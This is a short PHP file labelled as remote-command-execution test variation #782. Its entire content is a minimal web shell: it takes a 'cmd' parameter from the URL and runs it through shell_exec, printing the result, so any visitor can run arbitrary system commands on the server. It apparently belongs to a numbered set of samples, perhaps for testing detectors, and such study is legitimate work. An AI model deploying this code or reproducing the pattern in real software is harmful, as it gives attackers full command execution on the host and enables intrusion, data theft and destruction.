<?php
// RCE test variation #782
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>